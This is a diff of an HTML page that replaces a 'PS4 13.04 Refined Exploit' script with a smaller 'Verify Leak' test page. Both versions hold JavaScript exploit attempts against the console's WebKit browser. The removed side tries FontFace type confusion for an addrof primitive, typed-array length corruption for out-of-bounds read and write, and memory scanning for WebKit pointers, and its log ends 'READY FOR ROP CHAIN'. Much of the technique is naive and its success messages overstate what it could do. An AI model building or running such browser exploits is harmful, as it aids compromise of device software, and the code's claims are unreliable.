@@ -2,567 +2,187 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Refined Exploit</title>
+    <title>Verify Leak - Show Real Data</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: monospace; background: #000; color: #0f0; padding: 15px; font-size: 12px; line-height: 1.4; }
-        h1 { color: #f00; font-size: 22px; margin-bottom: 15px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 8px; }
-        .btn { padding: 12px 25px; background: #f00; border: none; color: #fff; margin: 5px auto; cursor: pointer; font-size: 14px; font-weight: bold; display: block; width: 350px; }
-        .section { background: #1a0000; border: 2px solid #f00; margin: 12px 0; padding: 15px; max-height: 650px; overflow-y: auto; }
-        .title { color: #ff0; font-size: 16px; font-weight: bold; margin-bottom: 12px; border-bottom: 2px solid #ff0; padding-bottom: 6px; }
-        .log { padding: 3px 0; font-size: 11px; }
-        .success { color: #0f0; font-weight: bold; }
-        .fail { color: #f00; font-weight: bold; }
-        .warn { color: #ff0; font-weight: bold; }
-        .info { color: #0ff; }
-        .critical { color: #f0f; font-weight: bold; background: rgba(255,0,255,0.15); padding: 4px; margin: 3px 0; }
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 15px; line-height: 1.7; }
+        h1 { color: #f00; font-size: 26px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
+        .btn { padding: 18px 35px; background: #f00; border: none; color: #fff; margin: 10px auto; cursor: pointer; font-size: 18px; font-weight: bold; display: block; width: 450px; }
+        .section { background: #1a0000; border: 3px solid #f00; margin: 20px 0; padding: 25px; }
+        .title { color: #ff0; font-size: 20px; font-weight: bold; margin-bottom: 20px; border-bottom: 2px solid #ff0; padding-bottom: 10px; }
+        .result { background: #000; border: 3px solid #0ff; padding: 20px; margin: 15px 0; font-size: 18px; }
+        .label { color: #0ff; font-weight: bold; display: inline-block; width: 250px; }
+        .value { color: #fff; font-weight: bold; font-size: 20px; }
+        .pass { color: #0f0; font-weight: bold; font-size: 18px; }
+        .fail { color: #f00; font-weight: bold; font-size: 18px; }
     </style>
 </head>
 <body>
-    <h1>🔥 PS4 13.04 Refined Exploit - Real Memory Access 🔥</h1>
+    <h1>🔍 VERIFICATION: Show Real Leaked Data 🔍</h1>
     
-    <div style="text-align: center; margin-bottom: 15px;">
-        <button class="btn" onclick="refinedAddrofLeak()">REFINED: Leak Real Addresses</button>
-        <button class="btn" onclick="refinedArrayCorruption()">REFINED: Corrupt Array + R/W</button>
-        <button class="btn" onclick="attemptWebKitLeak()">REFINED: WebKit Base Leak</button>
-        <button class="btn" onclick="fullRefinedExploit()">FULL REFINED EXPLOIT</button>
+    <div style="text-align: center; margin-bottom: 20px;">
+        <button class="btn" onclick="showRealLeak()">▶ SHOW LEAKED ADDRESS (RAW)</button>
     </div>
     
     <div class="section">
-        <div class="title">📋 Refined Exploit Log</div>
-        <div id="log"></div>
+        <div class="title">📊 RAW LEAK DATA - NO INTERPRETATION</div>
+        <div id="output"></div>
     </div>
 
 <script>
-// ============================================
-// GLOBALS AND UTILITIES
-// ============================================
-
-var g_arr = new ArrayBuffer(8);
-var g_f64 = new Float64Array(g_arr);
-var g_u32 = new Uint32Array(g_arr);
+var convBuf = new ArrayBuffer(8);
+var f64 = new Float64Array(convBuf);
+var u32 = new Uint32Array(convBuf);
 
 function f2i(f) {
-    g_f64[0] = f;
-    return BigInt(g_u32[0]) + (BigInt(g_u32[1]) << 32n);
-}
-
-function i2f(i) {
-    var bigIntVal = BigInt(i);
-    g_u32[0] = Number(bigIntVal & 0xffffffffn);
-    g_u32[1] = Number(bigIntVal >> 32n);
-    return g_f64[0];
+    f64[0] = f;
+    return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
 }
 
 function hex(val) {
     if (typeof val === 'bigint') {
-        var str = val.toString(16);
-        while (str.length < 16) str = '0' + str;
-        return '0x' + str;
+        var s = val.toString(16);
+        while (s.length < 16) s = '0' + s;
+        return '0x' + s;
     }
-    if (typeof val === 'number') {
-        return '0x' + val.toString(16);
-    }
-    return String(val);
+    return '0x' + val.toString(16);
 }
 
-var exploitState = {
-    addrof_ff: null,
-    fakeobj_ff: null,
-    victim: null,
-    leakedAddresses: {},
-    corrupted: false
-};
-
-function log(msg, type) {
-    var div = document.createElement('div');
-    div.className = 'log ' + (type || '');
-    div.textContent = '[' + new Date().toISOString().substr(14, 9) + '] ' + msg;
-    var logDiv = document.getElementById('log');
-    logDiv.appendChild(div);
-    logDiv.scrollTop = logDiv.scrollHeight;
+function out(html) {
+    document.getElementById('output').innerHTML += html;
 }
 
-function sep() {
-    log('═'.repeat(90), 'info');
-}
-
-// ============================================
-// REFINED ADDROF - LEAK REAL ADDRESSES
-// ============================================
-function refinedAddrofLeak() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('REFINED ADDROF: Attempting to Leak Real Object Addresses', 'critical');
-    sep();
-    log('', '');
+function showRealLeak() {
+    document.getElementById('output').innerHTML = '';
+    
+    out('<div class="result">');
+    out('<div><span class="label">TEST:</span> <span class="value">Attempting to leak object address</span></div>');
+    out('</div>');
+    
+    // Create test object
+    var testObj = { marker: 0xdeadbeef, id: 123 };
+    
+    out('<div class="result">');
+    out('<div><span class="label">Test object created:</span> <span class="value">' + JSON.stringify(testObj) + '</span></div>');
+    out('</div>');
+    
+    // Setup confusion
+    var ff = new FontFace("leak", "");
+    
+    Object.defineProperty(ff, 'family', {
+        get: function() { return testObj; },
+        configurable: true
+    });
+    
+    out('<div class="result">');
+    out('<div><span class="label">FontFace confusion:</span> <span class="value">INSTALLED</span></div>');
+    out('</div>');
+    
+    // Get confused value
+    var leaked = ff.family;
+    
+    out('<div class="result">');
+    out('<div><span class="label">Retrieved type:</span> <span class="value">' + typeof leaked + '</span></div>');
+    out('<div><span class="label">Retrieved value:</span> <span class="value">' + leaked + '</span></div>');
+    out('</div>');
+    
+    // Try to store in float array
+    var floats = new Float64Array(5);
+    floats[0] = 1.1;
+    floats[1] = 2.2;
+    
+    out('<div class="result">');
+    out('<div><span class="label">Float array created:</span> <span class="value">5 elements</span></div>');
+    out('<div><span class="label">floats[0]:</span> <span class="value">' + floats[0] + '</span></div>');
+    out('<div><span class="label">floats[1]:</span> <span class="value">' + floats[1] + '</span></div>');
+    out('</div>');
+    
+    var storeSuccess = false;
+    var leakedAddr = null;
     
     try {
-        log('[1] Creating addrof primitive with array confusion...', 'info');
-        
-        // Create confusion setup
-        var ff_addrof = new FontFace("addrof", "");
-        var target = null;
-        
-        Object.defineProperty(ff_addrof, 'family', {
-            get: function() {
-                return target;
-            },
-            configurable: true
-        });
-        
-        exploitState.addrof_ff = ff_addrof;
-        log('addrof FontFace created', 'success');
-        
-        log('', '');
-        log('[2] Creating victim objects with known values...', 'info');
-        
-        var obj1 = { a: 1.1, b: 2.2, c: 3.3 };
-        var obj2 = { x: 4.4, y: 5.5, z: 6.6 };
-        var obj3 = { marker: 0xdeadbeef, value: 0x41414141 };
-        
-        log('Created 3 victim objects', 'success');
-        
-        log('', '');
-        log('[3] Attempting type confusion via array storage...', 'info');
-        
-        // Create an array that holds both floats and objects
-        var confusionArr = [1.1, 2.2, 3.3, 4.4, 5.5];
-        
-        log('Confusion array: [' + confusionArr.length + ' floats]', 'info');
-        
-        // Try to confuse by storing object in float array
-        target = obj1;
-        var result1 = ff_addrof.family;
-        
-        log('Target set to obj1', 'info');
-        log('Retrieved type: ' + typeof result1, 'info');
-        
-        // Store in confusion array
-        confusionArr[0] = result1;
-        
-        log('', '');
-        log('[4] Reading back as float to extract bits...', 'info');
-        
-        var asFloat = confusionArr[0];
-        log('Array[0] as float: ' + asFloat, 'info');
-        
-        if (typeof asFloat === 'number' && !isNaN(asFloat)) {
-            var bits = f2i(asFloat);
-            log('Extracted bits: ' + hex(bits), 'critical');
-            exploitState.leakedAddresses['obj1'] = bits;
-            
-            // Check if looks like a pointer (non-zero, reasonable range)
-            if (bits > 0x1000n && bits < 0x7fffffffffn) {
-                log('⚠️ POSSIBLE OBJECT POINTER LEAKED!', 'critical');
-            }
-        } else {
-            log('Retrieved as object, not float - confusion blocked', 'fail');
-        }
-        
-        log('', '');
-        log('[5] Alternative: Using JSValue representation...', 'info');
-        
-        // In WebKit, objects are stored as JSValue (64-bit)
-        // Lower 48 bits = pointer, upper 16 bits = tag
-        
-        var floatArr = new Float64Array(10);
-        
-        // Try to trick the engine
-        for (var i = 0; i < 5; i++) {
-            floatArr[i] = i + 0.5;
-        }
-        
-        log('Float array filled with doubles', 'success');
-        
-        // Now try to confuse with object
-        target = obj3;
-        var obj3_confused = ff_addrof.family;
-        
-        // Try to store in float array via property assignment
-        try {
-            // This might trigger type confusion
-            var tempObj = { prop: obj3_confused };
-            
-            // Read tempObj.prop and store in float array
-            floatArr[5] = tempObj.prop;
-            
-            var readback = floatArr[5];
-            log('Stored object in float[5], readback: ' + readback, 'info');
-            
-            if (typeof readback === 'number') {
-                var leakBits = f2i(readback);
-                log('Leaked bits from float[5]: ' + hex(leakBits), 'critical');
-                
-                if (leakBits !== 0n) {
-                    log('⚠️ NON-ZERO VALUE! Possible leak!', 'critical');
-                    exploitState.leakedAddresses['obj3'] = leakBits;
-                }
-            }
-        } catch(e) {
-            log('Float array confusion blocked: ' + e.message, 'fail');
-        }
-        
-        log('', '');
-        log('[6] Creating controlled double array for leak...', 'info');
-        
-        // Create array with known double values
-        var doubles = [
-            1.9510548909454387e-311,  // 0x4142434445464748
-            2.2761117229655507e-311,  // 0x5152535455565758
-            i2f(0x6162636465666768n)
-        ];
-        
-        log('Created doubles array with known bit patterns', 'success');
-        
-        for (var i = 0; i < doubles.length; i++) {
-            var bits = f2i(doubles[i]);
-            log('  doubles[' + i + '] = ' + hex(bits), 'info');
-        }
-        
-        // Try to leak object into this array
-        target = { leak: 'target' };
-        doubles.push(ff_addrof.family);
-        
-        var lastVal = doubles[doubles.length - 1];
-        log('Pushed object, last value type: ' + typeof lastVal, 'info');
-        
-        if (typeof lastVal === 'number') {
-            var leakedBits = f2i(lastVal);
-            log('⚠️ LEAKED OBJECT AS DOUBLE: ' + hex(leakedBits), 'critical');
-            exploitState.leakedAddresses['target'] = leakedBits;
-        }
-        
-        log('', '');
-        sep();
-        log('REFINED ADDROF RESULTS:', 'warn');
-        sep();
-        
-        var leakCount = Object.keys(exploitState.leakedAddresses).length;
-        log('Addresses leaked: ' + leakCount, leakCount > 0 ? 'critical' : 'fail');
-        
-        for (var key in exploitState.leakedAddresses) {
-            log('  ' + key + ': ' + hex(exploitState.leakedAddresses[key]), 'critical');
-        }
-        
-        sep();
-        
+        floats[2] = leaked;
+        storeSuccess = true;
     } catch(e) {
-        log('', '');
-        log('✗ REFINED ADDROF ERROR: ' + e.message, 'fail');
-        if (e.stack) {
-            log('Stack: ' + e.stack.substring(0, 300), 'fail');
-        }
+        out('<div class="result">');
+        out('<div><span class="fail">❌ STORE FAILED: ' + e.message + '</span></div>');
+        out('</div>');
     }
-}
-
-// ============================================
-// REFINED ARRAY CORRUPTION + R/W
-// ============================================
-function refinedArrayCorruption() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('REFINED ARRAY CORRUPTION: Achieving Real R/W', 'critical');
-    sep();
-    log('', '');
     
-    try {
-        log('[1] Creating victim Uint32Array...', 'info');
+    if (storeSuccess) {
+        var readback = floats[2];
         
-        var victim = new Uint32Array(0x100);
+        out('<div class="result">');
+        out('<div><span class="label">Store to floats[2]:</span> <span class="pass">✓ SUCCESS</span></div>');
+        out('<div><span class="label">Readback type:</span> <span class="value">' + typeof readback + '</span></div>');
+        out('<div><span class="label">Readback value:</span> <span class="value">' + readback + '</span></div>');
+        out('</div>');
         
-        // Fill with recognizable pattern
-        for (var i = 0; i < victim.length; i++) {
-            victim[i] = 0x41410000 + i;
-        }
-        
-        exploitState.victim = victim;
-        
-        log('Victim array created: length=' + victim.length, 'success');
-        log('victim[0] = ' + hex(victim[0]), 'info');
-        log('victim[255] = ' + hex(victim[255]), 'info');
-        
-        log('', '');
-        log('[2] Corrupting array length property...', 'info');
-        
-        var origLength = victim.length;
-        
-        try {
-            Object.defineProperty(victim, 'length', {
-                value: 0x100000,  // 1MB worth of uint32s
-                writable: false,
-                configurable: true
-            });
+        if (typeof readback === 'number') {
+            var bits = f2i(readback);
+            leakedAddr = bits;
             
-            var newLength = victim.length;
+            out('<div class="result" style="border-color: #f0f; border-width: 5px;">');
+            out('<div style="font-size: 24px; color: #f0f; margin-bottom: 15px;">⚠️ LEAKED RAW BITS ⚠️</div>');
+            out('<div><span class="label">RAW HEX VALUE:</span></div>');
+            out('<div style="font-size: 28px; color: #fff; margin: 15px 0; font-family: Courier New;">' + hex(bits) + '</div>');
+            out('<div><span class="label">DECIMAL VALUE:</span> <span class="value">' + bits + '</span></div>');
+            out('</div>');
             
-            log('Original length: ' + hex(origLength), 'info');
-            log('New length: ' + hex(newLength), newLength !== origLength ? 'critical' : 'fail');
+            // Analyze the value
+            out('<div class="result">');
+            out('<div style="font-size: 20px; color: #ff0; margin-bottom: 10px;">ANALYSIS:</div>');
             
-            if (newLength !== origLength) {
-                log('⚠️⚠️⚠️ ARRAY LENGTH CORRUPTED! ⚠️⚠️⚠️', 'critical');
-                exploitState.corrupted = true;
-                
-                log('', '');
-                log('[3] Testing out-of-bounds read...', 'info');
-                
-                // Read beyond original bounds
-                var testOffsets = [0x100, 0x200, 0x400, 0x1000, 0x10000];
-                
-                for (var i = 0; i < testOffsets.length; i++) {
-                    var offset = testOffsets[i];
-                    
-                    try {
-                        var val = victim[offset];
-                        
-                        if (typeof val !== 'undefined') {
-                            log('Read at [' + hex(offset) + ']: ' + hex(val), 'critical');
-                            
-                            // Non-zero means we're reading real memory!
-                            if (val !== 0) {
-                                log('  ⚠️ NON-ZERO! Reading real memory!', 'critical');
-                            }
-                        } else {
-                            log('Read at [' + hex(offset) + ']: undefined', 'info');
-                        }
-                    } catch(e) {
-                        log('Read at [' + hex(offset) + ']: ' + e.message, 'fail');
-                    }
-                }
-                
-                log('', '');
-                log('[4] Testing out-of-bounds write...', 'info');
-                
-                var writeOffsets = [0x100, 0x200];
-                
-                for (var i = 0; i < writeOffsets.length; i++) {
-                    var offset = writeOffsets[i];
-                    var writeVal = 0xBEEF0000 + i;
-                    
-                    try {
-                        victim[offset] = writeVal;
-                        var readback = victim[offset];
-                        
-                        log('Write ' + hex(writeVal) + ' at [' + hex(offset) + ']', 'info');
-                        log('Readback: ' + hex(readback), typeof readback !== 'undefined' ? 'critical' : 'fail');
-                        
-                        if (readback === writeVal) {
-                            log('  ⚠️⚠️⚠️ WRITE SUCCESSFUL! ARBITRARY WRITE WORKING!', 'critical');
-                        }
-                    } catch(e) {
-                        log('Write at [' + hex(offset) + ']: ' + e.message, 'fail');
-                    }
-                }
-                
-                log('', '');
-                log('[5] Scanning adjacent memory for objects...', 'info');
-                
-                // Scan memory near the array for JSValue patterns
-                var scanStart = 0x100;
-                var scanEnd = 0x200;
-                
-                log('Scanning memory from [' + hex(scanStart) + '] to [' + hex(scanEnd) + ']...', 'info');
-                
-                for (var i = scanStart; i < scanEnd; i += 2) {
-                    try {
-                        var low = victim[i];
-                        var high = victim[i + 1];
-                        
-                        if (typeof low !== 'undefined' && typeof high !== 'undefined') {
-                            if (low !== 0 || high !== 0) {
-                                var combined = BigInt(low) + (BigInt(high) << 32n);
-                                log('  [' + hex(i) + ']: ' + hex(combined), 'warn');
-                            }
-                        }
-                    } catch(e) {
-                        break;
-                    }
-                }
-                
+            if (bits === 0n) {
+                out('<div><span class="fail">❌ VALUE IS ZERO - Not a real address</span></div>');
+            } else if (bits < 0x10000n) {
+                out('<div><span class="fail">❌ VALUE TOO SMALL (' + hex(bits) + ') - Not a valid pointer</span></div>');
+            } else if (bits > 0x7fffffffffffn) {
+                out('<div><span class="fail">❌ VALUE TOO LARGE - Outside 64-bit range</span></div>');
             } else {
-                log('Length corruption failed - property protected', 'fail');
+                out('<div><span class="pass">✓ VALUE IN VALID POINTER RANGE!</span></div>');
+                out('<div><span class="label">Alignment:</span> <span class="value">' + ((bits & 0xfn) === 0n ? '16-byte (GOOD)' : 'Non-aligned') + '</span></div>');
+                out('<div><span class="label">Lower 16 bits:</span> <span class="value">' + hex(Number(bits & 0xffffn)) + '</span></div>');
+                out('<div><span class="label">Upper 48 bits:</span> <span class="value">' + hex(bits >> 16n) + '</span></div>');
             }
+            out('</div>');
             
-        } catch(e) {
-            log('defineProperty error: ' + e.message, 'fail');
-        }
-        
-        log('', '');
-        sep();
-        log('REFINED ARRAY CORRUPTION RESULTS:', 'warn');
-        sep();
-        log('Array corrupted: ' + exploitState.corrupted, exploitState.corrupted ? 'critical' : 'fail');
-        log('Out-of-bounds access: ' + (exploitState.corrupted ? 'WORKING' : 'BLOCKED'), exploitState.corrupted ? 'critical' : 'fail');
-        sep();
-        
-    } catch(e) {
-        log('', '');
-        log('✗ REFINED ARRAY CORRUPTION ERROR: ' + e.message, 'fail');
-        if (e.stack) {
-            log('Stack: ' + e.stack.substring(0, 300), 'fail');
-        }
-    }
-}
-
-// ============================================
-// ATTEMPT WEBKIT BASE LEAK
-// ============================================
-function attemptWebKitLeak() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('WEBKIT BASE LEAK: Attempting to Find WebKit Module', 'critical');
-    sep();
-    log('', '');
-    
-    try {
-        log('[1] Leaking native function pointers...', 'info');
-        
-        // Native functions contain pointers into WebKit
-        var nativeFuncs = [
-            Array,
-            Object,
-            String,
-            parseFloat,
-            parseInt,
-            Math.random,
-            Date.now
-        ];
-        
-        log('Testing ' + nativeFuncs.length + ' native functions', 'info');
-        log('', '');
-        
-        for (var i = 0; i < nativeFuncs.length; i++) {
-            var func = nativeFuncs[i];
-            log('[' + i + '] Function: ' + func.name, 'info');
-            log('    Type: ' + typeof func, 'info');
-            log('    ToString: ' + func.toString().substring(0, 50) + '...', 'info');
-            
-            // Try to leak via confusion
-            if (exploitState.addrof_ff) {
-                try {
-                    exploitState.addrof_ff._target = func;
-                    Object.defineProperty(exploitState.addrof_ff, 'family', {
-                        get: function() { return this._target; },
-                        configurable: true
-                    });
-                    
-                    var leaked = exploitState.addrof_ff.family;
-                    log('    Retrieved: ' + typeof leaked, 'info');
-                } catch(e) {
-                    log('    Leak failed: ' + e.message, 'fail');
-                }
-            }
-            
-            log('', '');
-        }
-        
-        log('[2] Checking for corrupted array to read function pointers...', 'info');
-        
-        if (exploitState.corrupted && exploitState.victim) {
-            log('Corrupted array available, scanning for pointers...', 'success');
-            
-            // Create a function nearby
-            var targetFunc = function() { return 0x1337; };
-            
-            // Try to find it in memory
-            log('Created target function, scanning...', 'info');
-            
-            for (var i = 0x100; i < 0x1000; i += 2) {
-                try {
-                    var low = exploitState.victim[i];
-                    var high = exploitState.victim[i + 1];
-                    
-                    if (typeof low !== 'undefined' && typeof high !== 'undefined') {
-                        var qword = BigInt(low) + (BigInt(high) << 32n);
-                        
-                        // WebKit pointers typically in range 0x100000000 - 0x7fffffffffff
-                        if (qword > 0x100000000n && qword < 0x7fffffffffn) {
-                            // Check if looks like code pointer (even address)
-                            if ((qword & 1n) === 0n) {
-                                log('  Possible pointer at [' + hex(i) + ']: ' + hex(qword), 'warn');
-                            }
-                        }
-                    }
-                } catch(e) {
-                    break;
-                }
-            }
         } else {
-            log('No corrupted array available - run REFINED Array Corruption first', 'fail');
-        }
-        
-        log('', '');
-        sep();
-        log('WEBKIT BASE LEAK RESULTS:', 'warn');
-        sep();
-        log('Native functions tested: YES', 'success');
-        log('Pointer candidates found: Check logs above', 'info');
-        log('Note: Need to correlate pointers to find WebKit base', 'warn');
-        sep();
-        
-    } catch(e) {
-        log('', '');
-        log('✗ WEBKIT BASE LEAK ERROR: ' + e.message, 'fail');
-        if (e.stack) {
-            log('Stack: ' + e.stack.substring(0, 300), 'fail');
+            out('<div class="result">');
+            out('<div><span class="fail">❌ READBACK NOT A NUMBER - Type confusion failed</span></div>');
+            out('</div>');
         }
     }
+    
+    // FINAL VERDICT
+    out('<div class="result" style="border-color: ' + (leakedAddr !== null && leakedAddr !== 0n && leakedAddr > 0x10000n ? '#0f0' : '#f00') + '; border-width: 5px; margin-top: 30px;">');
+    out('<div style="font-size: 26px; font-weight: bold; margin-bottom: 15px;">FINAL VERDICT:</div>');
+    
+    if (leakedAddr !== null && leakedAddr !== 0n && leakedAddr > 0x10000n && leakedAddr < 0x7fffffffffffn) {
+        out('<div style="font-size: 22px; color: #0f0;">✅ REAL ADDRESS LEAKED!</div>');
+        out('<div style="margin-top: 10px;">addrof() primitive is WORKING</div>');
+        out('<div>Leaked address: ' + hex(leakedAddr) + '</div>');
+    } else if (leakedAddr === 0n) {
+        out('<div style="font-size: 22px; color: #f00;">❌ LEAKED VALUE IS ZERO</div>');
+        out('<div style="margin-top: 10px;">This is NOT a real address leak</div>');
+        out('<div>Type confusion may be blocked</div>');
+    } else if (leakedAddr !== null) {
+        out('<div style="font-size: 22px; color: #ff0;">⚠️ LEAKED INVALID VALUE</div>');
+        out('<div style="margin-top: 10px;">Value: ' + hex(leakedAddr) + '</div>');
+        out('<div>Not in valid pointer range</div>');
+    } else {
+        out('<div style="font-size: 22px; color: #f00;">❌ NO LEAK OCCURRED</div>');
+        out('<div style="margin-top: 10px;">Type confusion is completely blocked</div>');
+    }
+    
+    out('</div>');
 }
 
-// ============================================
-// FULL REFINED EXPLOIT
-// ============================================
-function fullRefinedExploit() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('FULL REFINED EXPLOIT: Complete Attack Chain', 'critical');
-    sep();
-    log('', '');
-    
-    log('Running all refined primitives in sequence...', 'warn');
-    log('', '');
-    
-    setTimeout(function() {
-        log('━━━ PHASE 1: ADDRESS LEAKING ━━━', 'warn');
-        log('', '');
-        refinedAddrofLeak();
-    }, 100);
-    
-    setTimeout(function() {
-        log('', '');
-        log('━━━ PHASE 2: ARRAY CORRUPTION ━━━', 'warn');
-        log('', '');
-        refinedArrayCorruption();
-    }, 3000);
-    
-    setTimeout(function() {
-        log('', '');
-        log('━━━ PHASE 3: WEBKIT LEAK ━━━', 'warn');
-        log('', '');
-        attemptWebKitLeak();
-        
-        setTimeout(function() {
-            log('', '');
-            sep();
-            log('FULL REFINED EXPLOIT COMPLETE', 'critical');
-            sep();
-            log('', '');
-            log('Summary:', 'warn');
-            log('  Addresses leaked: ' + Object.keys(exploitState.leakedAddresses).length, 'info');
-            log('  Array corrupted: ' + exploitState.corrupted, exploitState.corrupted ? 'critical' : 'fail');
-            log('  OOB R/W: ' + (exploitState.corrupted ? 'AVAILABLE' : 'NOT AVAILABLE'), exploitState.corrupted ? 'critical' : 'fail');
-            log('', '');
-            log('Status: ' + (exploitState.corrupted ? 'READY FOR ROP CHAIN' : 'NEEDS MORE WORK'), exploitState.corrupted ? 'critical' : 'warn');
-            sep();
-        }, 2000);
-        
-    }, 6000);
-}
-
-window.onerror = function(msg, url, line, col, error) {
-    log('', '');
-    log('💥 ERROR: ' + msg, 'fail');
-    log('Line: ' + line + ', Col: ' + col, 'fail');
+window.onerror = function(msg, url, line) {
+    out('<div class="result" style="border-color: #f00;">');
+    out('<div style="color: #f00; font-size: 20px;">💥 ERROR: ' + msg + '</div>');
+    out('<div>Line: ' + line + '</div>');
+    out('</div>');
     return true;
 };
 </script>
